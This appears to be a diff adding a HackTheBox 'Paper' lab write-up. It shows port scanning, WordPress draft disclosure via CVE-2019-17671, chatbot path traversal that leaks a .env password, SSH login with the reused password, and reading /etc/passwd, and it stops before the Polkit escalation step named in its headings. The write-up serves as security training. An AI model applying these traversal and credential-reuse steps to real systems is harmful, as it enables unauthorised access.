@@ -1,0 +1,820 @@
+I")<style>
+.time {
+    text-align: center;
+    margin-top: 30px;
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 300;
+    font-style: normal;
+}
+</style>
+
+<p class="time">19 Jun 2022 | Reading time: ~6 min</p>
+
+<h1 align="center">HackTheBox - Paper [Easy] </h1>
+
+<p class="time" style="font-size: 75%;">
+
+#CVE-2019-17671,
+
+#CVE-2021-3560,
+
+#Linux,
+
+#authorization-bypass,
+
+#credentials-reuse,
+
+#polkit-privesc,
+
+#rocket.chat,
+
+#wordpress
+
+</p>
+
+<p><img src="/assets/images/Screenshots/Paper/Paper.png" alt="box-summary.jpg" /></p>
+
+<hr />
+
+<h2 class="no_toc text-delta" id="table-of-contents">Table of contents</h2>
+
+<ol id="markdown-toc">
+  <li><a href="#resolution-summary" id="markdown-toc-resolution-summary">Resolution summary</a>    <ol>
+      <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills</a></li>
+      <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools</a></li>
+    </ol>
+  </li>
+  <li><a href="#information-gathering" id="markdown-toc-information-gathering">Information Gathering</a></li>
+  <li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a>    <ol>
+      <li><a href="#port-80---http-apache-httpd-2437-centos-openssl111k-mod_fcgid239" id="markdown-toc-port-80---http-apache-httpd-2437-centos-openssl111k-mod_fcgid239">Port 80 - HTTP (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9))</a>        <ol>
+          <li><a href="#officepaper---wordpress-523" id="markdown-toc-officepaper---wordpress-523">office.paper - (wordpress 5.2.3)</a></li>
+          <li><a href="#chatofficepaper-discovered-exploiting-unauthenticated-view-privatedraft-posts" id="markdown-toc-chatofficepaper-discovered-exploiting-unauthenticated-view-privatedraft-posts">chat.office.paper (discovered exploiting Unauthenticated View Private/Draft Posts)</a></li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+  <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a>    <ol>
+      <li><a href="#wordpress--523---unauthenticated-view-privatedraft-posts-cve-2019-17671" id="markdown-toc-wordpress--523---unauthenticated-view-privatedraft-posts-cve-2019-17671">WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts (CVE-2019-17671)</a></li>
+      <li><a href="#exploiting-recyclops-features" id="markdown-toc-exploiting-recyclops-features">Exploiting recyclops features</a></li>
+    </ol>
+  </li>
+  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a>    <ol>
+      <li><a href="#local-enumeration" id="markdown-toc-local-enumeration">Local enumeration</a></li>
+      <li><a href="#polkit-privilege-escalation-cve-2021-3560" id="markdown-toc-polkit-privilege-escalation-cve-2021-3560">Polkit Privilege Escalation (CVE-2021-3560)</a></li>
+    </ol>
+  </li>
+  <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li>
+</ol>
+<hr />
+
+<h1 id="resolution-summary">Resolution summary</h1>
+
+<ul>
+  <li>A server response from the HTTP web server discloses a DNS that points to a Wordpress blog vulnerable to <strong>Unauthenticated View Private/Draft Posts</strong> (CVE-2019-17671)</li>
+  <li>Exploiting the vulnerability we are able to <strong>leak</strong> restricted data, containing a <strong>secret registration token for RocketChat</strong> that allows us to create a custom user and access a restricted chat</li>
+  <li>On RocketChat it is possible to exploit some insecure functionalities of a custom bot in order to <strong>leaks recyclops credentials</strong> and <strong>reuse</strong> them to access the machine as dwight</li>
+  <li>The machine is vulnerable to <strong>Polkit Privilege Escalation</strong> (CVE-2021-3560). It is possible to create a custom sudoer account and thus escalate to root.</li>
+</ul>
+
+<h2 id="improved-skills">Improved skills</h2>
+
+<ul>
+  <li>Enumeration and exploitations of leaked secrets</li>
+  <li>Exploiting Wordpress known vulnerabilities</li>
+  <li>Abusing intended features lacking of security controls</li>
+  <li>Exploitation of Polkit Privilege Escalation</li>
+</ul>
+
+<h2 id="used-tools">Used tools</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>gobuster</li>
+  <li>wpscan</li>
+  <li>linpeas.sh</li>
+</ul>
+
+<hr />
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>Scanned all TCP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 10.10.11.143 <span class="nt">-v</span> <span class="nt">-oN</span> scan/all-tcp-ports.txt
+
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:24 EDT
+Initiating Ping Scan at 17:24
+Scanning 10.10.11.143 <span class="o">[</span>4 ports]
+...
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.85 seconds
+</code></pre></div></div>
+
+<p>Enumerated open TCP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80,443 10.10.11.143 <span class="nt">-oN</span> scan/open-tcp-ports.txt
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:25 EDT
+Nmap scan report <span class="k">for </span>10.10.11.143
+Host is up <span class="o">(</span>0.040s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
+|_http-generator: HTML Tidy <span class="k">for </span>HTML5 <span class="k">for </span>Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy <span class="k">for </span>HTML5 <span class="k">for </span>Linux version 5.7.28
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>Unspecified/countryName<span class="o">=</span>US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+|_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.17 seconds
+</code></pre></div></div>
+
+<p>Enumerated top 200 UDP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 200 10.10.11.143 <span class="nt">-oN</span> scan/top_200-udp-ports.txt
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:39 EDT
+Nmap scan report <span class="k">for </span>10.10.11.143
+Host is up <span class="o">(</span>0.040s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 199 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>
+PORT     STATE         SERVICE
+5353/udp open|filtered zeroconf
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>208.18 seconds
+</code></pre></div></div>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-80---http-apache-httpd-2437-centos-openssl111k-mod_fcgid239">Port 80 - HTTP (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9))</h2>
+
+<p>Browsed port 80:</p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled.png" alt="Untitled" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 403 Forbidden
+Date: Sat, 07 May 2022 21:41:58 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+</code></pre></div></div>
+<p>Discovered the domain <strong>office.paper</strong>.</p>
+
+<p>Enumerated web files and directories:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.11.143 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="nt">-t</span> 25 <span class="nt">-o</span> scan/p80-dirs.txt
+...
+/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.143/manual/]
+
+<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.11.143 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt <span class="nt">-t</span> 25 <span class="nt">-o</span> scan/p80-files.txt
+...
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.                    <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199691]
+/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htm                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htpasswds           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htgroup             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/poweredby.png        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5714]
+/.htaccess.bak        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htuser              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.htc                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/.ht                  <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/dispatch.fcgi        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/mytias.fcgi          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+/test.fcgi            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 199]
+</code></pre></div></div>
+
+<h3 id="officepaper---wordpress-523">office.paper - (wordpress 5.2.3)</h3>
+
+<p>Added <strong>office.paper</strong> to <strong>/etc/hosts</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo '10.10.11.143    office.paper' &gt;&gt; /etc/hosts</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%201.png" alt="Untitled" /></p>
+
+<p>Enumerated posts and comments:</p>
+
+<p><a href="http://office.paper/?s=">http://office.paper/?s=</a></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%202.png" alt="Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick" /></p>
+
+<blockquote>
+  <p>Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick</p>
+</blockquote>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%203.png" alt="Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick" /></p>
+
+<blockquote>
+  <p>Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Enumerated wordpress using <strong>wpscan</strong>:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+  └─<span class="nv">$ </span>wpscan <span class="nt">--url</span> office.paper
+  ...
+  <span class="o">[</span>+] URL: http://office.paper/ <span class="o">[</span>10.10.11.143]
+  <span class="o">[</span>+] Started: Sat May  7 17:54:40 2022
+    
+  Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+    
+  <span class="o">[</span>+] Headers
+   | Interesting Entries:
+   |  - Server: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+   |  - X-Powered-By: PHP/7.2.24
+   |  - X-Backend-Server: office.paper
+   | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confidence: 100%
+    
+  <span class="o">[</span>+] WordPress readme found: http://office.paper/readme.html
+   | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 100%
+    
+  <span class="o">[</span>+] WordPress version 5.2.3 identified <span class="o">(</span>Insecure, released on 2019-09-05<span class="o">)</span><span class="nb">.</span>
+   | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.2.3&lt;/generator&gt;
+   |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.2.3&lt;/generator&gt;
+    
+  <span class="o">[</span>+] WordPress theme <span class="k">in </span>use: construction-techup
+   | Location: http://office.paper/wp-content/themes/construction-techup/
+   | Last Updated: 2021-07-17T00:00:00.000Z
+   | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+   | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.4
+   | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver<span class="o">=</span>1.1
+   | Style Name: Construction Techup
+   | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful <span class="k">for </span>Business, corporate a...
+   | Author: wptexture
+   | Author URI: https://testerwp.com/
+   |
+   | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |
+   | Version: 1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
+   | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver<span class="o">=</span>1.1, Match: <span class="s1">'Version: 1.1'</span>
+    
+  <span class="o">[</span>+] Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+    
+  <span class="o">[</span>i] No plugins Found.
+    
+  <span class="o">[</span>+] Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+   Checking Config Backups - Time: 00:00:01 &lt;<span class="o">=============================================================================================================================================================&gt;</span> <span class="o">(</span>137 / 137<span class="o">)</span> 100.00% Time: 00:00:01
+    
+  <span class="o">[</span>i] No Config Backups Found.
+    
+  <span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+  <span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+    
+  <span class="o">[</span>+] Finished: Sat May  7 17:54:44 2022
+  <span class="o">[</span>+] Requests Done: 139
+  <span class="o">[</span>+] Cached Requests: 35
+  <span class="o">[</span>+] Data Sent: 34.539 KB
+  <span class="o">[</span>+] Data Received: 28.126 KB
+  <span class="o">[</span>+] Memory used: 231.141 MB
+  <span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:00:04
+    
+  ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]                                                                                                                                                                                                      
+  └─<span class="nv">$ </span>wpscan <span class="nt">--url</span> office.paper <span class="nt">-e</span> ap,vt,cb,dbe,u <span class="nt">--plugins-version-detection</span> aggressive <span class="nt">--plugins-detection</span> aggressive
+  ...
+  <span class="o">[</span>+] prisonmike
+   | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confirmed By:
+   |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+   |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+    
+  <span class="o">[</span>+] nick
+   | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+   | Confirmed By:
+   |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+    
+  <span class="o">[</span>+] creedthoughts
+   | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="chatofficepaper-discovered-exploiting-unauthenticated-view-privatedraft-posts">chat.office.paper (discovered exploiting Unauthenticated View Private/Draft Posts)</h3>
+<p>Browsed <strong>chat.office.paper</strong>:</p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%204.png" alt="Untitled" /></p>
+
+<p>Browsed the secret path, registered a user and enumerated private chats:</p>
+
+<p><a href="http://chat.office.paper/register/8qozr226AhkCHZdyY">http://chat.office.paper/register/8qozr226AhkCHZdyY</a></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%205.png" alt="Untitled" /></p>
+
+<aside>
+🔑 0xbro     maoutis
+
+</aside>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%206.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%207.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%208.png" alt="Untitled" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>recyclops Bot 11:21 AM
+kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to <span class="nb">help </span>my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable <span class="nb">time </span>to... well, not interact with his co-workers.
+Most frequently asked questions include:
+- What <span class="nb">time </span>is it?
+- What new files are <span class="k">in </span>your sales directory?
+- Why did the salesman crossed the road?
+- What<span class="s1">'s the content of file x in your sales directory? etc.
+Please note that I am a beta version and I still have some bugs to be fixed.
+How to use me ? :
+1. Small Talk:
+You can ask me how dwight'</span>s weekend was, or did he watched the game last night etc.
+eg: <span class="s1">'recyclops how was your weekend?'</span> or <span class="s1">'recyclops did you watched the game last night?'</span> or <span class="s1">'recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: '</span>recyclops why did the salesman crossed the road?<span class="s1">'
+&lt;=====The following two features are for those boneheads, who still don'</span>t know how to use scp. I<span class="s1">'m Looking at you Kevin.=====&gt;
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: '</span>recyclops get me the file test.txt<span class="s1">', or '</span>recyclops could you send me the file src/test.php<span class="s1">' or just '</span>recyclops file test.txt<span class="s1">'
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+</span></code></pre></div></div>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<h2 id="wordpress--523---unauthenticated-view-privatedraft-posts-cve-2019-17671">WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts (CVE-2019-17671)</h2>
+
+<p><a href="https://wpscan.com/vulnerability/9909"></a></p>
+
+<p>PoC: <a href="http://office.paper/?static=1">http://office.paper/?static=1</a></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%209.png" alt="Untitled" /></p>
+
+<h2 id="exploiting-recyclops-features">Exploiting recyclops features</h2>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%2010.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%2011.png" alt="Untitled" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>list ..
+Fetching the directory listing of ..
+total 32
+drwx------ 11 dwight dwight 281 Feb 6 07:46 <span class="nb">.</span>
+drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 18 May 10 2019 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 141 May 10 2019 .bash_profile
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 358 Jul 3 2021 .bashrc
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+<span class="nt">-rw-------</span> 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+<span class="nt">-rw-rw-r--</span> 1 dwight dwight 18 Sep 16 2021 .hubot_history
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
+<span class="nt">-r--------</span> 1 dwight dwight 33 May 7 17:23 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+total 32
+
+<span class="nv">$ </span>list ../hubot
+drwx------ 8 dwight dwight 4096 Sep 16 2021 <span class="nb">.</span>
+drwx------ 11 dwight dwight 281 Feb 6 07:46 ..
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 0 Jul 3 2021 <span class="se">\</span>
+srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
+srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 258 Sep 16 2021 .env
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 2 Jul 3 2021 external-scripts.json
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 917 Jul 3 2021 .gitignore
+<span class="nt">-rw-r--r--</span> 1 dwight dwight 135675 May 7 18:47 .hubot.log
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1068 Jul 3 2021 LICENSE
+drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
+drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 1062 Sep 16 2021 package.json
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 972 Sep 16 2021 package.json.bak
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 30382 Jul 3 2021 package-lock.json
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 14 Jul 3 2021 Procfile
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 5044 Jul 3 2021 README.md
+drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 100 Jul 3 2021 start_bot.sh
+drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
+<span class="nt">-rwxr-xr-x</span> 1 dwight dwight 29951 Jul 3 2021 yarn.lock
+
+<span class="nv">$ </span>file ../hubot/.env
+&lt;<span class="o">!=====</span>Contents of file ../hubot/.env<span class="o">=====&gt;</span>
+<span class="nb">export </span><span class="nv">ROCKETCHAT_URL</span><span class="o">=</span><span class="s1">'http://127.0.0.1:48320'</span>
+<span class="nb">export </span><span class="nv">ROCKETCHAT_USER</span><span class="o">=</span>recyclops
+<span class="nb">export </span><span class="nv">ROCKETCHAT_PASSWORD</span><span class="o">=</span>Queenofblad3s!23
+<span class="nb">export </span><span class="nv">ROCKETCHAT_USESSL</span><span class="o">=</span><span class="nb">false
+export </span><span class="nv">RESPOND_TO_DM</span><span class="o">=</span><span class="nb">true
+export </span><span class="nv">RESPOND_TO_EDITED</span><span class="o">=</span><span class="nb">true
+export </span><span class="nv">PORT</span><span class="o">=</span>8000
+<span class="nb">export </span><span class="nv">BIND_ADDRESS</span><span class="o">=</span>127.0.0.1
+&lt;<span class="o">!=====</span>End of file ../hubot/.env<span class="o">=====&gt;</span>
+</code></pre></div></div>
+
+<aside>
+🔑 recyclops     Queenofblad3s!23
+dwight     Queenofblad3s!23
+
+</aside>
+
+<p>Logged in trough SSH re-using recyclops password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span>ssh dwight@office.paper
+dwight@office.paper<span class="s1">'s password:
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ id; hostname; ip a; cat /home/dwight/user.txt
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+paper
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b9:e7:ed brd ff:ff:ff:ff:ff:ff
+    inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:e7ed/64 scope global dynamic mngtmpaddr
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::250:56ff:feb9:e7ed/64 scope link
+       valid_lft forever preferred_lft forever
+3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+       valid_lft forever preferred_lft forever
+4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
+    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+83482a8c2adcc4a365993c3653dc9517
+</span></code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<h2 id="local-enumeration">Local enumeration</h2>
+
+<p>Enumerated local users:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>dwight@paper ~]<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
